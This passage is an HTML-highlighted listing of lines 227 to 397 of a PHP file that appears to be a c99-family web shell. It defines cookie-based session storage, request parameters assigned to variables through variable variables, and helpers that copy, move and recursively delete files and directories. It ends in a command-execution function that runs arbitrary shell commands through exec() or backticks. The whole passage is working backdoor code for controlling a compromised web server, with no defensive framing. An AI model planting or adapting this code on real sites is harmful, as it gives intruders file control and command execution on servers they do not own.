<span class="lineno"> 227</span> <span class="p">}</span>
<span class="lineno"> 228</span> <span class="p">}</span>
<span class="lineno"> 229</span> <span class="nx">c999_buff_prepare</span><span class="p">();</span>
<span class="lineno"> 230</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;c999_sess_put&quot;</span><span class="p">))</span>
<span class="lineno"> 231</span> <span class="p">{</span>
<span class="lineno"> 232</span> <span class="k">function</span> <span class="nf">c999_sess_put</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
<span class="lineno"> 233</span> <span class="p">{</span>
<span class="lineno"> 234</span>  <span class="k">global</span> <span class="nv">$sess_cookie</span><span class="p">;</span>
<span class="lineno"> 235</span>  <span class="k">global</span> <span class="nv">$sess_data</span><span class="p">;</span>
<span class="lineno"> 236</span>  <span class="nx">c999_buff_prepare</span><span class="p">();</span>
<span class="lineno"> 237</span>  <span class="nv">$sess_data</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">;</span>
<span class="lineno"> 238</span>  <span class="nv">$data</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
<span class="lineno"> 239</span>  <span class="nb">setcookie</span><span class="p">(</span><span class="nv">$sess_cookie</span><span class="p">,</span><span class="nv">$data</span><span class="p">);</span>
<span class="lineno"> 240</span> <span class="p">}</span>
<span class="lineno"> 241</span> <span class="p">}</span>
<span class="lineno"> 242</span> <span class="k">foreach</span> <span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s2">&quot;sort&quot;</span><span class="p">,</span><span class="s2">&quot;sql_sort&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="nv">$v</span><span class="p">)</span>
<span class="lineno"> 243</span> <span class="p">{</span>
<span class="lineno"> 244</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nv">$v</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$$v</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nv">$v</span><span class="p">];}</span>
<span class="lineno"> 245</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="nv">$v</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$$v</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="nv">$v</span><span class="p">];}</span>
<span class="lineno"> 246</span> <span class="p">}</span>
<span class="lineno"> 247</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$sort_save</span><span class="p">)</span>
<span class="lineno"> 248</span> <span class="p">{</span>
<span class="lineno"> 249</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sort</span><span class="p">))</span> <span class="p">{</span><span class="nb">setcookie</span><span class="p">(</span><span class="s2">&quot;sort&quot;</span><span class="p">,</span><span class="nv">$sort</span><span class="p">);}</span>
<span class="lineno"> 250</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sql_sort</span><span class="p">))</span> <span class="p">{</span><span class="nb">setcookie</span><span class="p">(</span><span class="s2">&quot;sql_sort&quot;</span><span class="p">,</span><span class="nv">$sql_sort</span><span class="p">);}</span>
<span class="lineno"> 251</span> <span class="p">}</span>
<span class="lineno"> 252</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;str2mini&quot;</span><span class="p">))</span>
<span class="lineno"> 253</span> <span class="p">{</span>
<span class="lineno"> 254</span> <span class="k">function</span> <span class="nf">str2mini</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="nv">$len</span><span class="p">)</span>
<span class="lineno"> 255</span> <span class="p">{</span>
<span class="lineno"> 256</span>  <span class="k">if</span> <span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$content</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nv">$len</span><span class="p">)</span>
<span class="lineno"> 257</span>  <span class="p">{</span>
<span class="lineno"> 258</span>   <span class="nv">$len</span> <span class="o">=</span> <span class="nb">ceil</span><span class="p">(</span><span class="nv">$len</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mi">2</span><span class="p">;</span>
<span class="lineno"> 259</span>   <span class="k">return</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="nv">$len</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;...&quot;</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$content</span><span class="p">,</span><span class="o">-</span><span class="nv">$len</span><span class="p">);</span>
<span class="lineno"> 260</span>  <span class="p">}</span>
<span class="lineno"> 261</span>  <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="nv">$content</span><span class="p">;}</span>
<span class="lineno"> 262</span> <span class="p">}</span>
<span class="lineno"> 263</span> <span class="p">}</span>
<span class="lineno"> 264</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;view_size&quot;</span><span class="p">))</span>
<span class="lineno"> 265</span> <span class="p">{</span>
<span class="lineno"> 266</span> <span class="k">function</span> <span class="nf">view_size</span><span class="p">(</span><span class="nv">$size</span><span class="p">)</span>
<span class="lineno"> 267</span> <span class="p">{</span>
<span class="lineno"> 268</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$size</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="lineno"> 269</span>  <span class="k">else</span>
<span class="lineno"> 270</span>  <span class="p">{</span>
<span class="lineno"> 271</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&gt;=</span> <span class="mi">1073741824</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1073741824</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; GB&quot;</span><span class="p">;}</span>
<span class="lineno"> 272</span>   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&gt;=</span> <span class="mi">1048576</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1048576</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; MB&quot;</span><span class="p">;}</span>
<span class="lineno"> 273</span>   <span class="k">elseif</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&gt;=</span> <span class="mi">1024</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1024</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; KB&quot;</span><span class="p">;}</span>
<span class="lineno"> 274</span>   <span class="k">else</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nv">$size</span> <span class="o">.</span> <span class="s2">&quot; B&quot;</span><span class="p">;}</span>
<span class="lineno"> 275</span>   <span class="k">return</span> <span class="nv">$size</span><span class="p">;</span>
<span class="lineno"> 276</span>  <span class="p">}</span>
<span class="lineno"> 277</span> <span class="p">}</span>
<span class="lineno"> 278</span> <span class="p">}</span>
<span class="lineno"> 279</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;fs_copy_dir&quot;</span><span class="p">))</span>
<span class="lineno"> 280</span> <span class="p">{</span>
<span class="lineno"> 281</span> <span class="k">function</span> <span class="nf">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span>
<span class="lineno"> 282</span> <span class="p">{</span>
<span class="lineno"> 283</span>  <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno"> 284</span>  <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
<span class="lineno"> 285</span>  <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno"> 286</span>  <span class="k">while</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span>
<span class="lineno"> 287</span>  <span class="p">{</span>
<span class="lineno"> 288</span>   <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span>
<span class="lineno"> 289</span>   <span class="p">{</span>
<span class="lineno"> 290</span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
<span class="lineno"> 291</span>    <span class="k">else</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);</span> <span class="nx">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
<span class="lineno"> 292</span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nv">$ret</span><span class="p">;}</span>
<span class="lineno"> 293</span>   <span class="p">}</span>
<span class="lineno"> 294</span>  <span class="p">}</span>
<span class="lineno"> 295</span>  <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
<span class="lineno"> 296</span>  <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="lineno"> 297</span> <span class="p">}</span>
<span class="lineno"> 298</span> <span class="p">}</span>
<span class="lineno"> 299</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;fs_copy_obj&quot;</span><span class="p">))</span>
<span class="lineno"> 300</span> <span class="p">{</span>
<span class="lineno"> 301</span> <span class="k">function</span> <span class="nf">fs_copy_obj</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span>
<span class="lineno"> 302</span> <span class="p">{</span>
<span class="lineno"> 303</span>  <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno"> 304</span>  <span class="nv">$t</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
<span class="lineno"> 305</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nb">dirname</span><span class="p">(</span><span class="nv">$t</span><span class="p">)))</span> <span class="p">{</span><span class="nb">mkdir</span><span class="p">(</span><span class="nb">dirname</span><span class="p">(</span><span class="nv">$t</span><span class="p">));}</span>
<span class="lineno"> 306</span>  <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span>
<span class="lineno"> 307</span>  <span class="p">{</span>
<span class="lineno"> 308</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
<span class="lineno"> 309</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
<span class="lineno"> 310</span>   <span class="k">return</span> <span class="nx">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
<span class="lineno"> 311</span>  <span class="p">}</span>
<span class="lineno"> 312</span>  <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">);}</span>
<span class="lineno"> 313</span>  <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="lineno"> 314</span> <span class="p">}</span>
<span class="lineno"> 315</span> <span class="p">}</span>
<span class="lineno"> 316</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;fs_move_dir&quot;</span><span class="p">))</span>
<span class="lineno"> 317</span> <span class="p">{</span>
<span class="lineno"> 318</span> <span class="k">function</span> <span class="nf">fs_move_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span>
<span class="lineno"> 319</span> <span class="p">{</span>
<span class="lineno"> 320</span>  <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno"> 321</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$t</span><span class="p">))</span> <span class="p">{</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$t</span><span class="p">);}</span>
<span class="lineno"> 322</span>  <span class="k">while</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span>
<span class="lineno"> 323</span>  <span class="p">{</span>
<span class="lineno"> 324</span>   <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span>
<span class="lineno"> 325</span>   <span class="p">{</span>
<span class="lineno"> 326</span>    <span class="nv">$ret</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="lineno"> 327</span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
<span class="lineno"> 328</span>    <span class="k">else</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">)</span> <span class="k">and</span> <span class="nx">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;}}</span>
<span class="lineno"> 329</span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nv">$ret</span><span class="p">;}</span>
<span class="lineno"> 330</span>   <span class="p">}</span>
<span class="lineno"> 331</span>  <span class="p">}</span>
<span class="lineno"> 332</span>  <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
<span class="lineno"> 333</span>  <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="lineno"> 334</span> <span class="p">}</span>
<span class="lineno"> 335</span> <span class="p">}</span>
<span class="lineno"> 336</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;fs_move_obj&quot;</span><span class="p">))</span>
<span class="lineno"> 337</span> <span class="p">{</span>
<span class="lineno"> 338</span> <span class="k">function</span> <span class="nf">fs_move_obj</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span>
<span class="lineno"> 339</span> <span class="p">{</span>
<span class="lineno"> 340</span>  <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno"> 341</span>  <span class="nv">$t</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
<span class="lineno"> 342</span>  <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span>
<span class="lineno"> 343</span>  <span class="p">{</span>
<span class="lineno"> 344</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
<span class="lineno"> 345</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
<span class="lineno"> 346</span>   <span class="k">return</span> <span class="nx">fs_move_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
<span class="lineno"> 347</span>  <span class="p">}</span>
<span class="lineno"> 348</span>  <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span>
<span class="lineno"> 349</span>  <span class="p">{</span>
<span class="lineno"> 350</span>   <span class="k">if</span><span class="p">(</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="nb">unlink</span><span class="p">(</span><span class="nv">$d</span><span class="p">);}</span>
<span class="lineno"> 351</span>   <span class="k">else</span> <span class="p">{</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$t</span><span class="p">);</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="lineno"> 352</span>  <span class="p">}</span>
<span class="lineno"> 353</span>  <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="lineno"> 354</span> <span class="p">}</span>
<span class="lineno"> 355</span> <span class="p">}</span>
<span class="lineno"> 356</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;fs_rmdir&quot;</span><span class="p">))</span>
<span class="lineno"> 357</span> <span class="p">{</span>
<span class="lineno"> 358</span> <span class="k">function</span> <span class="nf">fs_rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span>
<span class="lineno"> 359</span> <span class="p">{</span>
<span class="lineno"> 360</span>  <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno"> 361</span>  <span class="k">while</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span>
<span class="lineno"> 362</span>  <span class="p">{</span>
<span class="lineno"> 363</span>   <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span>
<span class="lineno"> 364</span>   <span class="p">{</span>
<span class="lineno"> 365</span>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
<span class="lineno"> 366</span>    <span class="k">else</span> <span class="p">{</span><span class="nx">fs_rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">);</span> <span class="nb">rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
<span class="lineno"> 367</span>   <span class="p">}</span>
<span class="lineno"> 368</span>  <span class="p">}</span>
<span class="lineno"> 369</span>  <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
<span class="lineno"> 370</span>  <span class="nb">rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno"> 371</span>  <span class="k">return</span> <span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno"> 372</span> <span class="p">}</span>
<span class="lineno"> 373</span> <span class="p">}</span>
<span class="lineno"> 374</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;fs_rmobj&quot;</span><span class="p">))</span>
<span class="lineno"> 375</span> <span class="p">{</span>
<span class="lineno"> 376</span> <span class="k">function</span> <span class="nf">fs_rmobj</span><span class="p">(</span><span class="nv">$o</span><span class="p">)</span>
<span class="lineno"> 377</span> <span class="p">{</span>
<span class="lineno"> 378</span>  <span class="nv">$o</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span>
<span class="lineno"> 379</span>  <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span>
<span class="lineno"> 380</span>  <span class="p">{</span>
<span class="lineno"> 381</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$o</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$o</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
<span class="lineno"> 382</span>   <span class="k">return</span> <span class="nx">fs_rmdir</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
<span class="lineno"> 383</span>  <span class="p">}</span>
<span class="lineno"> 384</span>  <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="nb">unlink</span><span class="p">(</span><span class="nv">$o</span><span class="p">);}</span>
<span class="lineno"> 385</span>  <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="lineno"> 386</span> <span class="p">}</span>
<span class="lineno"> 387</span> <span class="p">}</span>
<span class="lineno"> 388</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;myshellexec&quot;</span><span class="p">))</span>
<span class="lineno"> 389</span> <span class="p">{</span>
<span class="lineno"> 390</span> <span class="k">function</span> <span class="nf">myshellexec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span>
<span class="lineno"> 391</span> <span class="p">{</span>
<span class="lineno"> 392</span>  <span class="k">global</span> <span class="nv">$disablefunc</span><span class="p">;</span>
<span class="lineno"> 393</span>  <span class="nv">$result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
<span class="lineno"> 394</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">))</span>
<span class="lineno"> 395</span>  <span class="p">{</span>
<span class="lineno"> 396</span>   <span class="k">if</span> <span class="p">(</span><span class="nb">is_callable</span><span class="p">(</span><span class="s2">&quot;exec&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;exec&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="nv">$result</span><span class="p">);</span> <span class="nv">$result</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$result</span><span class="p">);}</span>
<span class="lineno"> 397</span>   <span class="k">elseif</span> <span class="p">((</span><span class="nv">$result</span> <span class="o">=</span> <span class="sb">`$cmd`</span><span class="p">)</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{}</span>
